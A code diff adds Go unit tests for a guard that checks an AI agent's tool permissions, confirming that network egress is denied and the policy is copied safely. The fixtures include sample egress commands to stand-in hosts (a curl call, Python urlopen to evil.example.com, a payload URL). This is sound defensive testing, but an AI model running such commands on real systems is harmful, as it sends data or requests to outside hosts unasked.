@@ -406,3 +406,70 @@ var errTestSink = errTest("sink failed")
 type errTest string
 
 func (e errTest) Error() string { return string(e) }
+
+func TestGuardUnannotatedMCPToolScanned(t *testing.T) {
+	g := NewGuard(testPolicy())
+	req := &tool.PermissionRequest{
+		ToolName:  "custom_mcp_tool",
+		Arguments: mustArgs(t, map[string]any{"url": "https://evil.example/payload"}),
+	}
+	dec, _ := g.CheckToolPermission(context.Background(), req)
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("unannotated MCP tool with bad url = %q, want deny", dec.Action)
+	}
+}
+
+func TestGuardExecStdinScanned(t *testing.T) {
+	g := NewGuard(testPolicy())
+	req := &tool.PermissionRequest{
+		ToolName: "workspace_exec",
+		Arguments: mustArgs(t, map[string]any{
+			"command": "python",
+			"stdin":   "import urllib.request\nurllib.request.urlopen('http://evil.example.com')",
+		}),
+	}
+	dec, _ := g.CheckToolPermission(context.Background(), req)
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("exec stdin egress = %q, want deny", dec.Action)
+	}
+}
+
+func TestGuardWriteStdinToolClassified(t *testing.T) {
+	g := NewGuard(testPolicy())
+	req := &tool.PermissionRequest{
+		ToolName:  "workspace_write_stdin",
+		Arguments: mustArgs(t, map[string]any{"command": "curl http://evil.example.com"}),
+	}
+	dec, _ := g.CheckToolPermission(context.Background(), req)
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("write_stdin tool egress = %q, want deny", dec.Action)
+	}
+}
+
+func TestGuardPolicyDeepCopy(t *testing.T) {
+	pol := testPolicy()
+	origLen := len(pol.Network.AllowedHosts)
+	g := NewGuard(pol)
+	pol.Network.AllowedHosts = append(pol.Network.AllowedHosts, "evil.example")
+	got := g.Policy()
+	if len(got.Network.AllowedHosts) != origLen {
+		t.Fatalf("external mutation leaked into guard, want %d hosts got %d: %v", origLen, len(got.Network.AllowedHosts), got.Network.AllowedHosts)
+	}
+	gPol := g.Policy()
+	gPol.Network.AllowedHosts[0] = "mutated"
+	if g.Policy().Network.AllowedHosts[0] == "mutated" {
+		t.Error("mutating returned policy should not affect guard policy")
+	}
+}
+
+func TestGuardOversizedMCPArgsDenied(t *testing.T) {
+	g := NewGuard(testPolicy())
+	req := &tool.PermissionRequest{
+		ToolName:  "custom_mcp_tool",
+		Arguments: []byte(`"` + strings.Repeat("a", maxEnvelopeBytes+1) + `"`),
+	}
+	dec, _ := g.CheckToolPermission(context.Background(), req)
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("oversized MCP args = %q, want deny", dec.Action)
+	}
+}
